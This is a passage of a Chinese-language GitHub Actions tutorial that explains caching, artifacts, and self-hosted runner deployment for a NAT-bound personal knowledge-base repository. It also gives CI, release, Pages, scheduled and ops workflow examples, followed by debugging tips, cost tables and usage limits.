   ${{ runner.os }}-node-a1b2c3d4     ← lockfile 变了，key 就变了
        │
        ├─ 命中 → 直接恢复
        │
        └─ 未命中
             ▼
② 依次尝试 restore-keys 的前缀匹配（找最新的一个）
   Linux-node-                        ← 拿到上次的缓存
        │
        ▼
   用一个"部分过时"的缓存作为起点
   （npm ci 会增量补齐，比全量下载快得多）
        │
        ▼
③ step 结束时，用精确 key 保存新缓存
```

**三个关键性质：**

1. **缓存是不可变的**。如果 `key` 已经存在，不会覆盖——所以 key 里必须包含能反映依赖变化的指纹（`hashFiles` 是标准做法）。
2. **作用域按分支隔离**。PR 的缓存不会污染默认分支，默认分支的缓存在 PR 里可以读。
3. **10 GB 上限按仓库计**，超出会按 LRU 淘汰。缓存操作也有速率限制（每仓库每分钟 200 次上传 / 1500 次下载 / 400 次删除）。

**多数情况下你不需要手写 cache**——`setup-node`、`setup-python`、`setup-java` 都内建了缓存：

```yaml
- uses: actions/setup-node@v7
  with:
    node-version: '22'
    cache: 'npm'                      # ← 自动缓存 ~/.npm，key 基于 lockfile
    cache-dependency-path: '**/package-lock.json'   # monorepo 里指定 lockfile 位置
```

> [!warning] setup-node v7 的一个破坏性变更
> v7 **移除了 dummy `NODE_AUTH_TOKEN` 的兜底逻辑**。如果你设置了 `registry-url` 但没有提供 token，Yarn Classic (1.x) 和 pnpm 可能会失败。用这类包管理器的项目升级前留意。

### 9.3 Artifact 的背后

```yaml
jobs:
  build:
    steps:
      - run: npm run build                # 生成 dist/
      - uses: actions/upload-artifact@v7
        with:
          name: web-dist-${{ github.sha }}   # ← 名字里带 SHA，保证唯一
          path: dist/
          retention-days: 7
          compression-level: 6
          # archive: false                    # v7 新增：不打包，直接上传目录

  deploy:
    needs: build
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: web-dist-${{ github.sha }}
          path: dist/
      - run: ./deploy.sh dist/
```

**上传的底层**：action 并不把文件传给 GitHub 的服务器再转发。它向 **Actions Results 服务**（走 Twirp 协议，用 `ACTIONS_RUNTIME_TOKEN` 认证）请求一个**预签名的 Azure Blob URL**，然后**直传对象存储**：

```
runner                                Actions Results 服务          对象存储
  │                                          │                       │
  │ ① 我要上传 artifact X                    │                       │
  ├─────────────────────────────────────────►│                       │
  │ ◄────── ② 预签名的 Blob URL ─────────────┤                       │
  │                                                                  │
  │ ③ 分块直传（8 MB / 块，默认并发 16×CPU，上限 300）────────────────►│
  │                                                                  │
```

理解了这一点，就能解释：为什么大 artifact 的上传速度取决于你到对象存储的带宽而不是 GitHub；为什么 `ACTIONS_ARTIFACT_UPLOAD_CONCURRENCY` 这个环境变量存在；以及为什么官方说 artifact 需要网络出站访问。

> [!danger] upload-artifact v4 的破坏性变更
> v4 起 artifact 是**不可变的**，且**不允许从多个 job 上传到同一个 artifact 名字**——会直接报错。
>
> ```yaml
> # ❌ v4+ 会失败：多个 matrix job 都叫 "dist"
> - uses: actions/upload-artifact@v7
>   with:
>     name: dist
>
> # ✅ 名字里带上区分维度
> - uses: actions/upload-artifact@v7
>   with:
>     name: dist-${{ matrix.os }}-${{ matrix.node }}
> ```
>
> 所有用 v3 及更早版本的 workflow 都必须迁移——`actions/upload-artifact` 与 `download-artifact` 的 v3 已经废弃。

---

## 十、实战：让一个真实项目自动构建与发布

前九章是原理，这一章是操作。用一个**具体的、真实的**项目贯穿——本知识库仓库 `chunyujin295/yj-knowledge-bank`，它当前的部署方式在 1.1 节已经列过：手工 `git pull` + `systemctl restart`。

### 10.1 先做诊断：这个项目适合哪种自动化

在写 YAML 之前，先回答四个问题（对应第二章）：

| 问题 | 本项目的答案 |
|------|--------------|
| ① 什么时候跑？ | 推到 `main` 时（内容更新）、打 tag 时（发版）、每天定时（检查死链） |
| ② 在哪里跑？ | 检查类任务用 GitHub 托管即可；**部署任务需要碰到内网的物理机** |
| ③ 跑什么？ | 检查 Markdown/链接/HTML → 部署静态文件 → 重启服务 |
| ④ 结果去哪？ | 检查结果回传到 PR；部署结果回传到 commit status |

**难点在 ②。** 本项目的物理机在 NAT 后面，没有公网入口，只有一个 frpc 主动连出去建立的隧道：

```
GitHub ────► ?  ────► 物理机（NAT 后，无公网入口）
```

GitHub 托管的 runner 主动 SSH 连过去是**连不通的**。这直接决定了方案的选择。

### 10.2 部署方案的四种选择

| 方案 | 数据流向 | 是否可行（本项目） | 复杂度 | 延迟 |
|------|----------|-------------------|--------|------|
| **A. 托管 runner SSH 直连** | GitHub → 物理机 | ❌ 无公网入口 | 低 | 秒级 |
| **B. 物理机上的 self-hosted runner** | 物理机 → GitHub（长轮询） | ✅ **可行** | 中 | 秒级 |
| **C. 物理机定时拉取** | 物理机 → GitHub（轮询） | ✅ 可行 | 极低 | 分钟级 |
| **D. 云服务器跳板转发** | GitHub → 云服务器 → 隧道 → 物理机 | ✅ 可行 | 高 | 秒级 |

**方案 B 为什么可行？** 回到 5.2 节：runner 是**主动**向 GitHub 建立长轮询连接的，它不需要对外暴露任何端口。**这个设计恰好让自建 runner 能在 NAT 后面工作**——而这正是"GitHub 连不进来"这个问题的天然解。

**但方案 B 有一个前提条件**：如果这个仓库是**公开**的，直接挂 self-hosted runner 就是我反复警告的那条安全红线。要安全地使用，必须同时做到：

1. **部署 workflow 只监听 `on: push`**——绝不监听 `pull_request`。fork 的 PR 不会触发 `push` 事件，这就从源头上切断了"陌生人的代码在你的机器上执行"这条路径。
2. 仓库 Settings → Actions → **勾选 "Require approval for all outside collaborators"**。
3. workflow 里再加一道显式的身份判断：
   ```yaml
   if: github.repository_owner == 'chunyujin295' && github.actor == 'chunyujin295'
   ```
   （注意：这道判断写在使用 fork 代码的场景下是无效的，因为攻击者能改 workflow 文件——它只是**纵深防御的一层**，前提 1 才是真正起作用的那个。）

**方案 C 最省事**，适合"我能接受 5 分钟延迟"的场景。就是在物理机上换掉手工 `git pull`：

```bash
# /etc/systemd/system/yj-kb-autopull.service
[Unit]
Description=Auto pull yj-knowledge-bank
[Service]
Type=oneshot
User=yj
WorkingDirectory=/home/yj/code/yj-knowledge-bank
ExecStart=/usr/bin/git pull --ff-only
ExecStartPost=/usr/bin/sudo /usr/bin/systemctl restart yj-knowledge-bank

# /etc/systemd/system/yj-kb-autopull.timer
[Unit]
Description=Poll for updates every 5 minutes
[Timer]
OnCalendar=*:0/5
Persistent=true
[Install]
WantedBy=timers.target
```

```bash
sudo systemctl enable --now yj-kb-autopull.timer
```

代价：它是轮询，浪费请求；没有构建状态回传（GitHub 上永远显示绿色）；出错了没人知道。**它解决的是"忘记部署"，不是"构建失败可观测"。** 从这里起步，再升级到方案 B，是合理的路径。

### 10.3 场景一：CI —— 每次推送自动检查

这是收益最高、风险最低的一步。对文档类仓库，值得检查三件事：

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
    paths:
      - 'doc/**'
      - 'index.html'
      - '**/*.md'
  pull_request:
    branches: [main]

# 同一分支的新推送取消上一次未完成的运行
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read          # 只读代码，其他 scope 全部为 none

jobs:
  # ── 检查一：Markdown 风格 ──────────────────────────────
  markdown-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: 检查 Markdown 格式
        uses: DavidAnson/markdownlint-cli2-action@v24
        with:
          globs: '**/*.md'

  # ── 检查二：文档内链与外链是否还有效 ─────────────────────
  link-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: 检查链接
        uses: lycheeverse/lychee-action@v2
        with:
          args: >-
            --no-progress
            --max-concurrency 8
            --accept 200,206,429
            'doc/**/*.md'
            'index.html'
          fail: true

  # ── 检查三：首页卡片指向的页面是否真的存在 ─────────────────
  card-targets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: 校验 index.html 里的卡片链接
        run: |
          set -euo pipefail
          # 提取所有 data-category 卡片的 href
          grep -oP '(?<=<a class="card[^>]*href=")[^"]+' index.html > /tmp/links.txt
          echo "共 $(wc -l < /tmp/links.txt) 个卡片链接"
          missing=0
          while read -r link; do
            # 跳过外部链接
            case "$link" in http*) continue ;; esac
            # 去掉锚点后检查文件是否存在
            file="${link%%#*}"
            if [ ! -e "$file" ]; then
              echo "::error file=index.html::卡片指向的文件不存在: $link"
              missing=$((missing + 1))
            fi
          done < /tmp/links.txt
          echo "### 卡片链接检查" >> "$GITHUB_STEP_SUMMARY"
          echo "缺失 $missing 个" >> "$GITHUB_STEP_SUMMARY"
          [ "$missing" -eq 0 ]
```

> [!tip] 注意 `::error file=index.html::` 这个写法
> 这不是随便打印一行日志。带 `file=` 参数的 error 命令会让**错误直接标注在 PR 的 diff 行上**——reviewer 一眼就能看到哪个卡片坏了。同理 `::warning::` 和 `::notice::`。

三个 job 之间没有 `needs`，所以**并行执行**，整个 CI 大约 1 分钟。

### 10.4 场景二：自动部署（替代手工 `git pull`）

采用方案 B。**第一步是在物理机上注册 runner**：

```bash
# 在物理机上（yj 用户）
mkdir -p ~/actions-runner && cd ~/actions-runner
curl -o runner.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
tar xzf runner.tar.gz

# token 从仓库 Settings → Actions → Runners → New self-hosted runner 页面获取
./config.sh \
  --url https://github.com/chunyujin295/yj-knowledge-bank \
  --token <REGISTRATION_TOKEN> \
  --labels self-hosted,linux,yj-kb \
  --name yj-kb-runner

sudo ./svc.sh install yj
sudo ./svc.sh start
sudo ./svc.sh status
```

**第二步是给 runner 用户配置免密重启权限**（否则 workflow 里的 `systemctl restart` 会卡在密码提示上）：

```bash
# 在物理机上
echo 'yj ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart yj-knowledge-bank' \
  | sudo tee /etc/sudoers.d/yj-kb-deploy
sudo chmod 440 /etc/sudoers.d/yj-kb-deploy
```

**第三步写部署 workflow**：

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]
  workflow_dispatch:              # 允许手动触发，方便回滚时重跑

# 关键：只监听 push，绝不监听 pull_request
# 这保证了 fork 来的 PR 永远无法在这台机器上执行代码

concurrency:
  group: deploy-production
  cancel-in-progress: false       # 部署不能中途取消，否则状态可能不一致

permissions:
  contents: read

jobs:
  deploy:
    # 纵深防御：即使触发条件被误改，也再确认一次身份
    if: github.repository_owner == 'chunyujin295'
    runs-on: [self-hosted, linux, yj-kb]

    steps:
      - name: 拉取最新代码
        run: |
          set -euo pipefail
          cd /home/yj/code/yj-knowledge-bank
          git fetch --prune origin
          git reset --hard "origin/main"        # 用 reset 而不是 pull，避免本地脏改动导致冲突
          echo "现在部署的是：$(git log -1 --format='%h %s')"

      - name: 校验静态资源完整性
        run: |
          set -euo pipefail
          cd /home/yj/code/yj-knowledge-bank
          # 首页引用的资源必须存在
          test -f index.html
          test -d doc
          echo "文件检查通过"

      - name: 重启服务
        run: |
          set -euo pipefail
          sudo /usr/bin/systemctl restart yj-knowledge-bank
          # 等服务起来
          for i in $(seq 1 15); do
            if curl -fsS http://127.0.0.1:5004/ > /dev/null; then
              echo "服务已就绪（第 ${i} 次探测）"
              exit 0
            fi
            sleep 1
          done
          echo "::error::服务在 15 秒内没有就绪"
          sudo /usr/bin/journalctl -u yj-knowledge-bank -n 50 --no-pager
          exit 1

      - name: 写运行摘要
        if: ${{ !cancelled() }}
        run: |
          {
            echo "## 部署结果"
            echo ""
            echo "| 项目 | 值 |"
            echo "|------|-----|"
            echo "| 提交 | \`${GITHUB_SHA::7}\` |"
            echo "| 触发者 | @${GITHUB_ACTOR} |"
            echo "| 分支 | ${GITHUB_REF_NAME} |"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: 失败时回滚提示
        if: ${{ failure() }}
        run: |
          echo "::warning::部署失败，请检查物理机状态。回滚方式："
          echo "  cd /home/yj/code/yj-knowledge-bank && git reset --hard <上一个commit> && sudo systemctl restart yj-knowledge-bank"
```

**几点设计说明：**

| 选择 | 理由 |
|------|------|
| `git reset --hard origin/main` 而非 `git pull` | 物理机上如果有本地脏改动，`pull` 会冲突卡住；`reset` 是幂等的，保证结果只取决于远端 |
| `cancel-in-progress: false` | 部署过程中被取消会留下"代码已更新但服务没重启"的中间态。宁可排队 |
| 重启后主动探测端口 | 不假设 `systemctl restart` 返回 0 就等于服务可用 |
| 失败时打印 journalctl | 把日志直接送到 GitHub 的运行页面，不用再 SSH 上去看 |
| `if: ${{ !cancelled() }}` 而非 `always()` | 写摘要不该在超时/取消时硬跑（见 6.5 的说明） |

### 10.5 场景三：打 tag 自动发布 Release

对程序类项目，这是最标准的一步。**注意：不使用已归档的 `actions/create-release`**（那个仓库 2020 年后就没有维护了），改用 `gh` CLI 或 `softprops/action-gh-release`。

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    tags: ['v*.*.*']                # 只匹配 v1.2.3 这样的 tag

permissions:
  contents: write                   # 创建 release 需要写权限

jobs:
  build-and-release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0            # 需要完整历史才能生成 release notes

      - uses: actions/setup-node@v7
        with:
          node-version: '22'
          cache: 'npm'

      - name: 构建
        run: |
          npm ci
          npm run build

      - name: 打包
        run: tar -czf dist-${{ github.ref_name }}.tar.gz dist/

      - name: 生成校验和
        run: sha256sum dist-${{ github.ref_name }}.tar.gz > checksums.txt

      - name: 创建 Release
        run: |
          gh release create "$GITHUB_REF_NAME" \
            --title "$GITHUB_REF_NAME" \
            --generate-notes \
            ./dist-${{ github.ref_name }}.tar.gz \
            ./checksums.txt
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

发布流程就是：

```bash
git tag -a v1.2.0 -m "release v1.2.0"
git push origin v1.2.0        # ← 这一下就触发了上面的 workflow
```

> [!note] Immutable Releases
> GitHub 现在支持**不可变发布**：发布后 tag 不能被移动、assets 不能被修改或删除，并且会自动生成 release attestation。推荐流程是"先建 draft → 传完所有 assets → 再发布"。如果关心供应链安全，可以在仓库设置里开启。

### 10.6 场景四：发布到 GitHub Pages

如果不想维护自己的服务器，静态站点可以直接托管在 Pages 上（私有仓库需要 Pro/Team）。

```yaml
# .github/workflows/pages.yml
name: Deploy to Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read
  pages: write
  id-token: write                   # Pages 部署走 OIDC

concurrency:
  group: pages
  cancel-in-progress: false         # 官方模板就是这么写的：部署不取消

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/configure-pages@v6
      - name: 构建（本项目是纯静态，只需整理目录）
        run: |
          mkdir -p _site
          cp -r index.html doc assets img _site/
      - uses: actions/upload-pages-artifact@v5
        with:
          path: ./_site

  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - id: deployment
        uses: actions/deploy-pages@v5
```

### 10.7 场景五：定时任务

```yaml
# .github/workflows/nightly.yml
name: Nightly Checks

on:
  schedule:
    - cron: '17 3 * * *'            # 每天 UTC 03:17，注意是 UTC
  workflow_dispatch:                # ← 加上这个才能手动测试

permissions:
  contents: read
  issues: write                     # 发现问题自动开 issue

jobs:
  dead-link-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - name: 全量扫描死链
        uses: lycheeverse/lychee-action@v2
        with:
          args: --no-progress --max-concurrency 4 '**/*.md' '**/*.html'
          fail: false               # 不让扫描结果决定 job 成败
      - name: 有坏链就开 issue
        if: ${{ env.LYCHEE_EXIT_CODE != '0' }}
        run: |
          gh issue create \
            --title "死链扫描发现 $(date +%F) 的问题" \
            --body-file ./lychee/out.md \
            --label "broken-links"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**`schedule` 的四个坑：**

1. **只支持标准 cron，且只在默认分支上运行**。用 `@daily` 这类扩展语法会解析失败。
2. **时间是 UTC**，不是你的本地时间。北京时间要减 8 小时（`'17 3 * * *'` = 北京时间 11:17）。
3. **公开仓库连续 60 天无活动后，定时任务会被自动禁用**。要长期运行就得定期有人操作仓库。
4. **负载高时会延迟执行**，可能晚几分钟到几十分钟。别用它做精确的时间调度。

### 10.8 场景六：手动触发的运维脚本

`workflow_dispatch` 是"把运维脚本放进仓库"的载体——比散落在 shell history 里的脚本安全得多，因为有审计记录、有权限控制、有运行日志。

```yaml
# .github/workflows/ops.yml
name: Ops

on:
  workflow_dispatch:
    inputs:
      action:
        description: '要执行的操作'
        required: true
        type: choice
        options:
          - rebuild-cache
          - check-server-health
          - rollback
      target_commit:
        description: '回滚目标 commit（action=rollback 时必填）'
        required: false
        type: string
      dry_run:
        description: '只演练，不实际执行'
        required: false
        type: boolean
        default: true

run-name: "运维: ${{ inputs.action }} by @${{ github.actor }}"

jobs:
  run:
    runs-on: ubuntu-latest
    environment: production          # ← 走审批流程
    steps:
      - uses: actions/checkout@v7
      - name: 执行
        run: |
          echo "操作：${{ inputs.action }}"
          echo "演练模式：${{ inputs.dry_run }}"
          # inputs.dry_run 是 boolean 类型，在表达式里是真布尔值，
          # 但通过 ${{ }} 插进 shell 后会变成字符串 "true"/"false"
```

**`workflow_dispatch` 的输入类型**：`string` / `boolean` / `choice` / `environment` / `number`。顶层输入**最多 10 个**。

> [!warning] 一个常见困惑
> `inputs.*` 和 `github.event.inputs.*` 是同一份数据的两个视图。**`inputs.*` 保留类型（boolean 就是 boolean），而 `github.event.inputs.*` 会把所有值转成字符串**（`false` 变成 `"false"`，在 `if` 里判断时会当成真）。**统一用 `inputs.*`。**

### 10.9 场景七：复用——composite action 与 reusable workflow

当多个 workflow 出现重复片段时，有两种复用机制，用途不同：

| | **Composite Action** | **Reusable Workflow** |
|--|----------------------|------------------------|
| 复用的是什么 | 一串 **step** | 一整个 **job**（含 runs-on、strategy、environment） |
| 位置 | `.github/actions/<name>/action.yml` | `.github/workflows/<name>.yml` |
| 调用方式 | `uses: ./.github/actions/<name>` | `uses: ./.github/workflows/x.yml` |
| 能否跨仓库 | ✅ | ✅ |
| 每步必须写 `shell:` | ✅ 是 | 不适用 |
| 触发上下文 | 继承调用者 | 可通过 `on.workflow_call.inputs` 声明 |

**Reusable Workflow 的写法：**

```yaml
# .github/workflows/reusable-deploy.yml
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
      source-path:
        type: string
        default: './dist'
    secrets:
      ssh-key:
        required: true
    outputs:
      deployed-sha:
        description: '部署的 commit'
        value: ${{ jobs.deploy.outputs.sha }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    outputs:
      sha: ${{ steps.d.outputs.sha }}
    steps:
      - uses: actions/checkout@v7
      - id: d
        run: |
          echo "部署 ${{ inputs.source-path }} 到 ${{ inputs.environment }}"
          echo "sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"
```

调用方**只能使用这几个字段**：`name`、`uses`、`with`、`secrets`、`strategy`、`needs`、`if`、`concurrency`、`permissions`、`cache-mode`。

```yaml
jobs:
  staging:
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: staging
    secrets:
      ssh-key: ${{ secrets.STAGING_SSH_KEY }}
```

**Reusable workflow 的四个限制：**

1. **嵌套最多 10 层**（GHES 是 4 层）。
2. 一个顶层文件最多引用 **50 个**不同的 reusable workflow。
3. **workflow 级的 `env` 不会传递**（双向都不传）。
4. **`GITHUB_TOKEN` 的权限只能被被调用方降级，不能被提权**。runner 分配和计费都按**调用方**算。

### 10.10 从零开始给任意项目加自动化的清单

把上面的经验抽象成一个通用流程：

```
① 明确目标
   ├─ 只是想在 PR 上跑测试？        → 只需 CI（10.3）
   ├─ 想自动发布版本？              → 加 Release（10.5）
   ├─ 想自动部署？                  → 先解决"网络可达性"（10.2）
   └─ 想定时做维护？                → 加 schedule（10.7）

② 确定触发条件
   ├─ 主分支推送 / PR → CI
   ├─ tag 推送       → Release
   ├─ 手动           → 运维脚本
   └─ 定时           → 巡检、清理、报表

③ 确定执行环境
   ├─ 标准需求 → ubuntu-latest（免费、快）
   ├─ 需要 macOS 签名 → macos-latest（贵 10 倍，注意并发上限 5）
   ├─ 需要内网/特殊硬件 → self-hosted（先读 5.4 的安全红线）
   └─ 需要数据库 → 用 services: 起容器，不要装到 runner 上

④ 设计 job 图
   ├─ 检查类任务全部并行（无 needs）
   ├─ 构建 → 测试 → 部署 串行（有 needs）
   └─ 用 outputs 传少量数据，用 artifacts 传文件

⑤ 声明权限
   └─ 从 permissions: contents: read 起手，按需加 scope
      （记住：写了一个 scope，其余全变 none）

⑥ 加固
   ├─ 第三方 action pin 到 SHA
   ├─ concurrency 控制并发
   ├─ 部署走 environment + 审批
   ├─ 云凭证用 OIDC 而不是长期密钥
   └─ 加 actionlint / zizmor 到 CI

⑦ 让失败可见
   ├─ 失败时打印足够的诊断信息
   ├─ 用 ::error file=X:: 把错误标到 PR 上
   └─ 关键流程加通知（Issue / IM webhook）
```

---

## 十一、调试与排错

### 11.1 日志在哪

```
仓库 → Actions → 选择 workflow → 选择某次运行
  ├─ 左侧：job 列表（可以点进单个 job 看 step 展开）
  ├─ 每个 step 展开后是完整的 stdout/stderr
  ├─ 右上角 "Download log archive" 可以下载完整日志 zip
  └─ 失败时，失败的那一行会有 `::error::` 标注
```

**两个关键日志开关**（在仓库 Settings → Secrets and variables → Actions 里加）：

| 名称 | 作用 |
|------|------|
| `ACTIONS_STEP_DEBUG` = `true` | 步骤级调试日志（runner 会输出更多内部信息） |
| `ACTIONS_RUNNER_DEBUG` = `true` | runner 诊断日志，会在日志 zip 里多出 `runner-diagnostic-logs/` 目录，包含 runner 进程日志和 worker 进程日志 |

> [!tip] 不用建 secret 也能开调试
> **任何能触发 workflow 的人，都可以在"重新运行"时勾选启用调试日志**——不需要仓库管理员配 secret。UI 上 Re-run jobs → 勾选 "Enable debug logging"。这是临时排查最方便的方式。

**`runner.debug` 上下文**可以让你写"只在调试模式下才执行"的步骤：

```yaml
- name: 打印环境诊断信息
  if: ${{ runner.debug == '1' }}
  run: |
    env | sort
    df -h
    free -m
```

### 11.2 交互式调试

想知道 runner 里到底长什么样，可以用 `tmate` 类 action 开一个反向 SSH 会话：

```yaml
- name: 打开调试会话
  if: ${{ github.event_name == 'workflow_dispatch' }}
  uses: mxschmitt/action-tmate@v3
  timeout-minutes: 15
```

> [!warning] 这会把一个可登录的 shell 暴露到公网
> 一定要限制触发条件（上面的 `if` 只是个例子，实际上任何人都能手动触发 `workflow_dispatch`），或者加上 `limited-access` 之类的输入限制。**用完立刻取消运行。**

### 11.3 本地运行

`act` 可以在本地用 Docker 跑 workflow（当前版本 **v0.2.89**，仍在积极维护）：

```bash
act -l                                    # 列出可触发的 workflow
act push                                  # 模拟 push 事件
act pull_request -j test                  # 只跑 test job
act -s GITHUB_TOKEN=xxx                   # 传入 secret
act --reuse                                # 复用容器，加速
```

**但它是把 GitHub 的调度逻辑重写了一遍**，不是真正的 runner。以下场景不要指望它：
- `actions/cache`（需要真实的缓存服务）
- artifact 上传下载（需要 OIDC/token 链路）
- 托管 runner 特有的行为（`GITHUB_TOKEN` 的真实权限模型）
- 各种平台特定的环境差异

**用它的正确姿势**：本地快速验证 shell 脚本逻辑和 YAML 语法，正式验证还是推到 GitHub。

### 11.4 静态检查

```bash
# actionlint：语法 + shellcheck + 表达式类型
brew install actionlint            # 或下载二进制
actionlint -color

# zizmor：安全审计
pipx install zizmor
zizmor .github/workflows/
zizmor --format sarif .github/workflows/ > results.sarif   # 可以上传到 GitHub 的 code scanning
```

### 11.5 常见故障对照表

| 症状 | 最可能的原因 |
|------|--------------|
| **推了代码，Actions 里什么都没出现** | ① workflow 文件不在 `.github/workflows/` ② YAML 语法错误 ③ `on:` 过滤器没匹配上（`branches`/`paths` 是 AND） ④ 仓库的 Actions 被禁用了 |
| **`workflow_dispatch` 没有按钮** | 该 workflow 不存在于**默认分支** |
| **PR 里改的 workflow 没生效** | `pull_request` 事件用的是合并提交里的文件；如果是 `pull_request_target`，用的是默认分支的文件 |
| **环境变量在下一个 step 里不见了** | 用了 `export` 而不是写 `$GITHUB_ENV`（见 6.6） |
| **`cd` 到子目录后下一个 step 又回根目录** | 每个 `run` 是新 shell。用 `working-directory:`（见 6.4） |
| **`::set-output` 报错或不起作用** | 该命令已移除，改用 `$GITHUB_OUTPUT`（见 6.6） |
| **job 一直停在 Queued** | 并发配额用完了（Free 20 / macOS 5），或者 `runs-on` 的标签没有匹配的 runner |
| **`if:` 里的条件没生效** | 以 `!` 开头时没写 `${{ }}`；或者忘了隐含的 `success()`（见 6.5） |
| **矩阵跑了一堆不必要的组合** | `exclude` 是部分匹配，`include` 在 `exclude` 之后处理（见 6.3） |
| **多个 job 上传同名 artifact 报错** | upload-artifact v4+ 不允许同名，名字里加上 `matrix.*` 区分（见 9.3） |
| **PR 评论/打标签失败** | 显式写了 `permissions:` 导致未列出的 scope 变成 `none`（见 8.2） |
| **YAML 解析错误** | 用了 Tab 缩进；或者模式以 `*`/`!` 开头没加引号 |
| **私有依赖拉不下来** | secrets 没配；fork PR 拿不到 secrets（这是设计如此） |
| **macOS job 排队很久** | macOS 并发上限只有 5，是共享的（标准 + 大型 runner 都算） |

---

## 十二、成本与限额

### 12.1 免费的部分

| 场景 | 是否免费 |
|------|----------|
| **公开仓库 + 标准 GitHub 托管 runner** | ✅ 完全免费、不限分钟数 |
| **任何仓库 + self-hosted runner** | ✅ 免费（GitHub 不计费，你付自己的电费和运维） |
| 私有仓库 + 标准 runner | ❌ 消耗套餐内分钟数，超出后按分钟计费 |
| **大型 runner（larger runners）** | ❌ 即使是公开仓库也计费，且**不能用套餐内分钟数抵扣** |

### 12.2 私有仓库的额度

| 套餐 | 每月分钟数 | Artifact 存储 | Cache 存储 |
|------|-----------|---------------|-----------|
| Free（个人） | 2,000 | 500 MB | 10 GB / 仓库 |
| Pro | 3,000 | 1 GB | 10 GB / 仓库 |
| Free（组织） | 2,000 | 500 MB | 10 GB / 仓库 |
| Team | 3,000 | 2 GB | 10 GB / 仓库 |
| Enterprise Cloud | 50,000 | 50 GB | 10 GB / 仓库 |

**注意 artifact 存储和 Packages 存储共享一个额度池，而缓存是单独的 10 GB/仓库**。缓存在计费上更宽松。

### 12.3 每分钟费率（标准 runner，四舍五入到整分钟）

| 配置 | 单价 |
|------|------|
| Linux 1 核（`ubuntu-slim`） | $0.002 |
| Linux 2 核 x64 | $0.006 |
| Linux 2 核 arm64 | $0.005 |
| Windows 2 核 | $0.010 |
| **macOS（3 核 M1 或 4 核 Intel）** | **$0.062** |

> [!warning] macOS 是 Linux 的 10 倍
> 一个跑 20 分钟的 macOS job 花 $1.24，同样的 Linux job 花 $0.12。**只在真正需要 Xcode / 代码签名时才用 macOS runner。** 能用 Linux 交叉编译的场景就不要上 macOS。

### 12.4 硬性限额

| 限制项 | 值 |
|--------|-----|
| **单个 job 执行时长（托管）** | **6 小时** |
| 单个 job 执行时长（self-hosted） | 5 天 |
| **整个 workflow run 的总时长**（含等待与审批） | **35 天**，之后取消 |
| Environment 审批最长等待 | 30 天 |
| 自建 runner 的 job 排队时长 | 24 小时（超时自动取消） |
| `ubuntu-slim` job 超时 | 15 分钟 |
| **矩阵 job 数** | **256 / 每次运行** |
| **重新运行次数** | **50 次 / 每次运行** |
| **workflow 文件大小** | **500 KB**（超过不会启动） |
| 并发（Free / Pro / Team / Enterprise） | 20 / 40 / 60 / 500 |
| 并发（macOS，所有套餐） | 5（Team / Enterprise 的大型 runner 另计） |
| 缓存操作速率 | 200 上传 / 1500 下载 / 400 删除，每分钟每仓库 |
| artifact 与日志保留 | 默认 90 天（公开 1–90，私有 1–400） |

> [!note] 支持也不能提的限额
> 存储额度和 workflow run 总时长（35 天）是硬限制，**GitHub 支持也改不了**。并发数可以申请提升。

### 12.5 省钱的六个技巧

1. **用 `concurrency` + `cancel-in-progress: true`**。连续推 5 次，只跑最后一次——对文档仓库能省掉 80% 的运行。
2. **`paths` 过滤**。改了 `doc/` 就别触发前端构建。
3. **`timeout-minutes`**。默认没有超时（只有 6 小时的硬上限）。一个卡住的任务能悄悄烧掉 6 小时的钱。
4. **缓存依赖**。`setup-node` 的 `cache: 'npm'` 一行通常能省 30 秒以上。
5. **`fail-fast: true`（默认值）**。矩阵里第一个失败就取消其余——除非你真的想看到所有平台的失败情况。
6. **能用公开仓库就用公开仓库**。这是最根本的一条：公开仓库的标准 runner 完全免费。

---

## 十三、关键概念速查表

| 概念 | 英文 | 一句话解释 | 章节 |
|------|------|-----------|------|
| 工作流 | Workflow | 一个 `.github/workflows/*.yml` 文件定义的完整流水线 | 3.2 |
| 作业 | Job | 一次执行单元，独占一台机器，job 间默认并行且隔离 | 3.2 |
| 步骤 | Step | 一条命令或一个 action，顺序执行，共享文件系统 | 3.2 |
| 动作 | Action | 可复用的构建块，分 JS / Docker / Composite 三种 | 7.1 |
| 执行器 | Runner | 真正执行 job 的机器，托管（Azure VM）或自建 | 5.1 |
| 事件 | Event | 仓库上发生的事情，触发 workflow 的源头 | 4.2 |
| 引用更新 | Ref update | `git push` 的本质：把某个 ref 从 A 改成 B | 4.1 |
| 活动类型 | Activity type | 同一事件的不同细分（如 PR 的 opened/synchronize/closed） | 4.4 |
| 路径过滤 | paths filter | 根据本次推送改动的文件决定是否触发，与 branches 是 AND | 4.4 |
| 长轮询 | Long poll | runner 主动挂起的取任务请求，使其可工作在 NAT 后 | 5.2 |
| 临时执行器 | Ephemeral runner | 跑完一个 job 即销毁的 runner，是安全与隔离的基础 | 5.1, 5.4 |
| 执行器控制器 | ARC | Actions Runner Controller，K8s 上自建 runner 的官方方案 | 5.4 |
| 上下文 | Context | `${{ }}` 里可访问的 12 个命名空间 | 6.5 |
